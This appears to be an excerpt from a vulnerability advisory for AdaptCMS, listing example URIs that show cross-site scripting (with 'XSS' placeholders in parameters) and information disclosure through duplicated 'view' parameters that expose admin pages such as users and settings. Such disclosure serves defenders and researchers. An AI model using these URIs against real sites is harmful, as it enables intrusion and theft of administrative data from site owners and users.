Attackers can exploit the information disclosure issue through a browser. To exploit a cross-site scripting vulnerability, an attacker must entice an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/AdaptCMS/admin.php?view=XSS
http://www.example.com/AdaptCMS/admin.php?view=share&amp;do=XSS
http://www.example.com/AdaptCMS//index.php?'XSS
http://www.example.com/AdaptCMS/admin.php?view=/&amp;view=settings
http://www.example.com/AdaptCMS/admin.php?view=/&amp;view=users
http://www.example.com/AdaptCMS/admin.php?view=/&amp;view=groups
http://www.example.com/AdaptCMS/admin.php?view=/&amp;view=levels
http://www.example.com/AdaptCMS/admin.php?view=/&amp;view=stats
